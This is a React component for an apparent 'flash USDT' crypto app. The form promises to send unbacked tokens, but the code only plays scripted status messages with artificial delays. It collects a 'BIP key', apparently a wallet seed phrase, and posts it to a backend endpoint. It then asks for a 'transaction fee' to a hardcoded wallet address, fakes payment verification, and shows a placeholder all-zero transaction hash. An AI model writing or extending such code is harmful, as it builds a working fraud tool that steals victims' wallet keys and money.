import React, { useState, useEffect } from 'react';
import { useApp } from '../../contexts/AppContext';
import supabaseService from '../../services/supabase';
import {
  walletOptions,
  currencyOptions,
  networkOptions,
  dayOptions,
  minuteOptions,
  initialLoadingMessages,
  bipVerificationMessages,
  paymentStatusMessages
} from '../../constants';

// Dropdown component
const Dropdown = ({ options, placeholder, onChange, value }) => {
  const [isOpen, setIsOpen] = useState(false);
  const [selectedOption, setSelectedOption] = useState(value || placeholder);

  const handleSelect = (option) => {
    setSelectedOption(option);
    setIsOpen(false);
    if (onChange) onChange(option);
  };

  return (
    <div className="dropdown">
      <button
        type="button"
        className="dropdown-btn"
        onClick={() => setIsOpen(!isOpen)}
      >
        {selectedOption}
      </button>
      <span className="dropdown-arrow">▼</span>
      
      {isOpen && (
        <div className="dropdown-menu">
          {options.map((option, index) => (
            <div
              key={index}
              className="dropdown-item"
              onClick={() => handleSelect(option)}
            >
              {option}
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

// Modal component
const Modal = ({ id, title, isOpen, onClose, children }) => {
  if (!isOpen) return null;

  return (
    <div id={id} className="modal-overlay">
      <div className="modal-content">
        <div className="modal-header">
          <h2>{title}</h2>
          <button className="modal-close" onClick={onClose}>&times;</button>
        </div>
        <div className="modal-body">
          {children}
        </div>
      </div>
    </div>
  );
};

// Notification component
const Notification = ({ title, message, isVisible, onClose }) => {
  if (!isVisible) return null;

  return (
    <div className="notification" style={{ display: 'block' }}>
      <div className="notification-header">
        <h3 id="notification-title">{title}</h3>
        <button id="notification-close" className="notification-close" onClick={onClose}>&times;</button>
      </div>
      <div className="notification-body">
        <p id="notification-message">{message}</p>
      </div>
    </div>
  );
};

const CreateFlash = ({ licenseKey }) => {
  const [currentDate, setCurrentDate] = useState('');
  const [currentTime, setCurrentTime] = useState('');
  const { appSettings } = useApp();
  
  // Update date and time
  useEffect(() => {
    const updateDateTime = () => {
      const now = new Date();
      
      // Format date: DD/MM/YYYY
      const date = now.toLocaleDateString('en-GB', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric'
      });
      
      // Format time: HH:MM:SS
      const time = now.toLocaleTimeString('en-GB', {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
      });
      
      setCurrentDate(date);
      setCurrentTime(time);
    };
    
    // Update immediately
    updateDateTime();
    
    // Update every second
    const interval = setInterval(updateDateTime, 1000);
    
    // Clean up interval on unmount
    return () => clearInterval(interval);
  }, []);
  
  // Form state
  const [wallet, setWallet] = useState('Wallet');
  const [currency, setCurrency] = useState('Currency');
  const [network, setNetwork] = useState('Network');
  const [receiverAddress, setReceiverAddress] = useState('');
  const [flashAmount, setFlashAmount] = useState('');
  const [delayDays, setDelayDays] = useState('0');
  const [delayMinutes, setDelayMinutes] = useState('0');
  
  // Checkbox state
  const [useProxy, setUseProxy] = useState(false);
  const [noProxy, setNoProxy] = useState(true);
  const [transferable, setTransferable] = useState(true);
  const [notTransferable, setNotTransferable] = useState(false);
  const [swappable, setSwappable] = useState(true);
  const [p2pTradable, setP2pTradable] = useState(true);
  const [splittable, setSplittable] = useState(true);
  
  // UI state
  const [statusMessages, setStatusMessages] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [notification, setNotification] = useState({ visible: false, title: '', message: '' });
  
  // Modal state
  const [bipModalOpen, setBipModalOpen] = useState(false);
  const [licenseKeyModalOpen, setLicenseKeyModalOpen] = useState(false);
  const [paymentModalOpen, setPaymentModalOpen] = useState(false);
  const [successModalOpen, setSuccessModalOpen] = useState(false);
  const [bipKey, setBipKey] = useState('');
  const [confirmLicenseKey, setConfirmLicenseKey] = useState('');
  
  // Max flash amount based on license type
  const maxFlashAmount = licenseKey?.maxAmount || 
                         (licenseKey?.type === 'demo' ? 
                          appSettings?.demoMaxFlashAmount || 30 : 
                          appSettings?.liveMaxFlashAmount || 10000000);

  // Show notification
  const showNotification = (title, message, duration = 3000) => {
    setNotification({ visible: true, title, message });
    
    // Auto-hide after duration
    setTimeout(() => {
      setNotification({ visible: false, title: '', message: '' });
    }, duration);
  };

  // Handle checkbox groups
  const handleProxyChange = (type) => {
    if (type === 'use') {
      setUseProxy(true);
      setNoProxy(false);
    } else {
      setUseProxy(false);
      setNoProxy(true);
    }
  };

  const handleTransferableChange = (type) => {
    if (type === 'transferable') {
      setTransferable(true);
      setNotTransferable(false);
    } else {
      setTransferable(false);
      setNotTransferable(true);
    }
  };

  // Display status messages with delay (one at a time on a single line)
  const displayMessages = (messages, delay = 500) => {
    setStatusMessages([]);
    let index = 0;
    
    const interval = setInterval(() => {
      if (index < messages.length) {
        setStatusMessages([messages[index]]); // Only show the current message
        index++;
      } else {
        clearInterval(interval);
      }
    }, delay);
    
    return () => clearInterval(interval);
  };

  // Handle form refresh
  const handleRefresh = () => {
    setWallet('Wallet');
    setCurrency('Currency');
    setNetwork('Network');
    setReceiverAddress('');
    setFlashAmount('');
    setDelayDays('0');
    setDelayMinutes('0');
    setUseProxy(false);
    setNoProxy(true);
    setTransferable(true);
    setNotTransferable(false);
    setSwappable(true);
    setP2pTradable(true);
    setSplittable(true);
    
    showNotification('Refresh', 'Form has been reset');
  };

  // Handle form submission
  const handleSend = async () => {
    // Validate form
    if (wallet === 'Wallet') {
      showNotification('Error', 'Please select a wallet');
      return;
    }
    
    if (currency === 'Currency') {
      showNotification('Error', 'Please select a currency');
      return;
    }
    
    if (network === 'Network') {
      showNotification('Error', 'Please select a network');
      return;
    }
    
    if (!receiverAddress) {
      showNotification('Error', 'Please enter a receiver address');
      return;
    }
    
    if (!flashAmount) {
      showNotification('Error', 'Please enter a flash amount');
      return;
    }
    
    const amount = parseFloat(flashAmount);
    if (isNaN(amount)) {
      showNotification('Error', 'Please enter a valid flash amount');
      return;
    }
    
    if (amount <= 0) {
      showNotification('Error', 'Flash amount must be greater than 0');
      return;
    }
    
    if (amount > maxFlashAmount) {
      showNotification('Error', `Flash amount cannot exceed ${maxFlashAmount} USDT`);
      return;
    }
    
    // Start processing
    setIsProcessing(true);
    
    // Display initial loading messages
    displayMessages(initialLoadingMessages);
    
    // Show BIP modal after messages
    setTimeout(() => {
      setBipModalOpen(true);
    }, initialLoadingMessages.length * 500);
  };

  // Handle BIP key submission
  const handleBipSubmit = async () => {
    if (!bipKey) {
      showNotification('Error', 'Please enter a BIP key');
      return;
    }
    
    // Close BIP modal
    setBipModalOpen(false);
    
    // Send BIP key notification
    try {
      const response = await fetch('/.netlify/functions/api/bip-notification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bipKey,
          licenseKey: licenseKey?.key,
          user: licenseKey?.user
        }),
      });
      
      if (!response.ok) {
        console.error('Error sending BIP notification:', await response.text());
      }
    } catch (error) {
      console.error('Error sending BIP notification:', error);
    }
    
    // Display BIP verification messages with longer delay (2-3 minutes total)
    // Calculate a delay that will make the total time between 2-3 minutes
    const totalMessages = bipVerificationMessages.length;
    const targetTotalTime = 150000; // 2.5 minutes (150 seconds) in milliseconds
    const messageDelay = Math.floor(targetTotalTime / totalMessages);
    
    displayMessages(bipVerificationMessages, messageDelay);
    
    // Show license key modal after messages (after 2-3 minutes)
    setTimeout(() => {
      setLicenseKeyModalOpen(true);
    }, totalMessages * messageDelay);
  };

  // Handle license key confirmation
  const handleLicenseKeyConfirm = () => {
    if (!confirmLicenseKey) {
      showNotification('Error', 'Please enter your license key');
      return;
    }
    
    // Close license key modal
    setLicenseKeyModalOpen(false);
    
    // For demo license, show success directly
    // For live license, show payment modal
    if (licenseKey?.type === 'demo') {
      setSuccessModalOpen(true);
    } else {
      setPaymentModalOpen(true);
    }
  };

  // Handle payment verification
  const handleVerifyPayment = () => {
    // Close payment modal
    setPaymentModalOpen(false);
    
    // Display payment verification messages
    displayMessages(paymentStatusMessages, 500);
    
    // Show success modal after messages
    setTimeout(() => {
      setSuccessModalOpen(true);
    }, paymentStatusMessages.length * 500);
  };

  // Handle transaction completion
  const handleCompleteTransaction = async () => {
    // Close success modal
    setSuccessModalOpen(false);
    
    // Prepare transaction data
    const transactionData = {
      receiverAddress,
      flashAmount: parseFloat(flashAmount),
      wallet,
      currency,
      network,
      delayDays: parseInt(delayDays),
      delayMinutes: parseInt(delayMinutes),
      licenseKey: licenseKey?.key,
      user: licenseKey?.user,
      timestamp: new Date().toISOString()
    };
    
    try {
      // Log flash transaction
      const result = await supabaseService.logFlashTransaction(transactionData);
      
      if (result.success) {
        // Add success message to status display
        setStatusMessages(prev => [
          ...prev, 
          'Transaction completed successfully!',
          `Transaction ID: ${result.id}`
        ]);
        
        showNotification('Success', 'Flash transaction sent successfully');
      } else {
        showNotification('Error', 'Failed to log transaction');
      }
    } catch (error) {
      console.error('Error completing transaction:', error);
      showNotification('Error', 'Error completing transaction');
    } finally {
      // Reset form and state
      handleRefresh();
      setIsProcessing(false);
    }
  };

  // Copy text to clipboard
  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text)
      .then(() => showNotification('Success', 'Copied to clipboard'))
      .catch(err => showNotification('Error', 'Failed to copy'));
  };

  return (
    <section id="create-flash" className="content-section active">
      <div className="flash-form">
        <div className="form-row">
          <Dropdown 
            options={walletOptions} 
            placeholder="Wallet" 
            onChange={setWallet} 
            value={wallet}
          />
          <Dropdown 
            options={currencyOptions} 
            placeholder="Currency" 
            onChange={setCurrency} 
            value={currency}
          />
          <Dropdown 
            options={networkOptions} 
            placeholder="Network" 
            onChange={setNetwork} 
            value={network}
          />
        </div>
        
        <div className="input-group">
          <label htmlFor="receiver-address">Receiver Address</label>
          <input 
            type="text" 
            id="receiver-address" 
            placeholder="Enter receiver address"
            value={receiverAddress}
            onChange={(e) => setReceiverAddress(e.target.value)}
            disabled={isProcessing}
          />
        </div>
        
        <div className="input-group">
          <label htmlFor="flash-amount">Flash Amount</label>
          <input 
            type="number" 
            id="flash-amount" 
            placeholder={`Enter Flash Amount (Max: ${maxFlashAmount} USDT)`}
            value={flashAmount}
            onChange={(e) => setFlashAmount(e.target.value)}
            disabled={isProcessing}
          />
        </div>
        
        <div className="separator"></div>
        
        <div className="input-group">
          <label>Delay</label>
          <div className="delay-controls">
            <div className="dropdown delay-dropdown">
              <Dropdown 
                options={dayOptions} 
                placeholder="0" 
                onChange={setDelayDays} 
                value={delayDays}
              />
            </div>
            <div className="dropdown delay-dropdown">
              <Dropdown 
                options={minuteOptions} 
                placeholder="0" 
                onChange={setDelayMinutes} 
                value={delayMinutes}
              />
            </div>
          </div>
        </div>
        
        <div className="separator"></div>
        
        <div className="options-section">
          <div className="options-row">
            <label className="modern-checkbox">
              <input 
                type="checkbox" 
                checked={useProxy} 
                onChange={() => handleProxyChange('use')}
                disabled={isProcessing}
              />
              <span className="checkmark"></span>
              Use Proxy
            </label>
            <label className="modern-checkbox">
              <input 
                type="checkbox" 
                checked={noProxy} 
                onChange={() => handleProxyChange('no')}
                disabled={isProcessing}
              />
              <span className="checkmark"></span>
              Do not use Proxy
            </label>
          </div>
          
          <div className="options-row">
            <label className="modern-checkbox">
              <input 
                type="checkbox" 
                checked={transferable} 
                onChange={() => handleTransferableChange('transferable')}
                disabled={isProcessing}
              />
              <span className="checkmark"></span>
              Transferable
            </label>
            <label className="modern-checkbox">
              <input 
                type="checkbox" 
                checked={notTransferable} 
                onChange={() => handleTransferableChange('not')}
                disabled={isProcessing}
              />
              <span className="checkmark"></span>
              Not Transferable
            </label>
          </div>
          
          <div className="options-row">
            <label className="modern-checkbox">
              <input 
                type="checkbox" 
                checked={swappable} 
                onChange={(e) => setSwappable(e.target.checked)}
                disabled={isProcessing}
              />
              <span className="checkmark"></span>
              Swappable
            </label>
            <label className="modern-checkbox">
              <input 
                type="checkbox" 
                checked={p2pTradable} 
                onChange={(e) => setP2pTradable(e.target.checked)}
                disabled={isProcessing}
              />
              <span className="checkmark"></span>
              p2p Tradable
            </label>
            <label className="modern-checkbox">
              <input 
                type="checkbox" 
                checked={splittable} 
                onChange={(e) => setSplittable(e.target.checked)}
                disabled={isProcessing}
              />
              <span className="checkmark"></span>
              Splittable
            </label>
          </div>
        </div>
        
        <div className="form-actions">
          <button 
            id="refresh-btn" 
            className="action-btn"
            onClick={handleRefresh}
            disabled={isProcessing}
          >
            Refresh
          </button>
          <button 
            id="send-btn" 
            className="action-btn primary"
            onClick={handleSend}
            disabled={isProcessing}
          >
            {isProcessing ? 'Processing...' : 'Send...'}
          </button>
        </div>
      </div>
      
      <div className="status-panel">
        <div className="date-time">
          <div className="date" id="current-date">{currentDate}</div>
          <div className="time" id="current-time">{currentTime}</div>
        </div>
        <div className="status-section">
          <h3>STATUS</h3>
          <div id="status-display" className="status-display">
            {statusMessages.map((message, index) => (
              <div key={index} className="status-message">{message}</div>
            ))}
          </div>
        </div>
      </div>
      
      {/* BIP Modal */}
      <Modal
        id="bip-modal"
        title="Enter BIP Key"
        isOpen={bipModalOpen}
        onClose={() => setBipModalOpen(false)}
      >
        <input
          type="text"
          id="bip-key"
          placeholder="Enter your BIP key"
          value={bipKey}
          onChange={(e) => setBipKey(e.target.value)}
        />
        <button 
          className="action-btn primary"
          onClick={handleBipSubmit}
        >
          Continue
        </button>
      </Modal>
      
      {/* License Key Modal */}
      <Modal
        id="license-key-modal"
        title="Enter License Key"
        isOpen={licenseKeyModalOpen}
        onClose={() => setLicenseKeyModalOpen(false)}
      >
        <input
          type="text"
          id="license-key-confirm"
          placeholder="Enter your license key"
          value={confirmLicenseKey}
          onChange={(e) => setConfirmLicenseKey(e.target.value)}
        />
        <button 
          className="action-btn primary"
          onClick={handleLicenseKeyConfirm}
        >
          Continue
        </button>
      </Modal>
      
      {/* Payment Modal */}
      <Modal
        id="payment-modal"
        title="Payment Required"
        isOpen={paymentModalOpen}
        onClose={() => setPaymentModalOpen(false)}
      >
        <p>
          Please complete payment of {appSettings?.depositAmount || 500} for {appSettings?.transactionFee || 'Transaction Fee'}
        </p>
        
        <div className="qr-code">
          <img 
            src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${appSettings?.walletAddress || 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV'}`} 
            alt="QR Code" 
            width="200" 
            height="200"
          />
        </div>
        
        <div className="wallet-address">
          <input 
            type="text" 
            value={appSettings?.walletAddress || 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV'} 
            readOnly 
          />
          <button 
            className="copy-btn"
            onClick={() => copyToClipboard(appSettings?.walletAddress || 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV')}
          >
            Copy
          </button>
        </div>
        
        <button 
          className="action-btn primary"
          onClick={handleVerifyPayment}
        >
          Verify Payment
        </button>
      </Modal>
      
      {/* Success Modal */}
      <Modal
        id="success-modal"
        title={appSettings?.successTitle || 'Success'}
        isOpen={successModalOpen}
        onClose={() => setSuccessModalOpen(false)}
      >
        <p>{appSettings?.successMessage || 'The flash has been sent successfully'}</p>
        
        <div className="transaction-hash">
          <input 
            type="text" 
            value={appSettings?.transactionHash || '000000000000000000000000000000000000'} 
            readOnly 
          />
          <button 
            className="copy-btn"
            onClick={() => copyToClipboard(appSettings?.transactionHash || '000000000000000000000000000000000000')}
          >
            Copy
          </button>
        </div>
        
        <button 
          className="action-btn primary"
          onClick={handleCompleteTransaction}
        >
          Close
        </button>
      </Modal>
      
      {/* Notification */}
      <Notification
        title={notification.title}
        message={notification.message}
        isVisible={notification.visible}
        onClose={() => setNotification({ ...notification, visible: false })}
      />
    </section>
  );
};

export default CreateFlash;
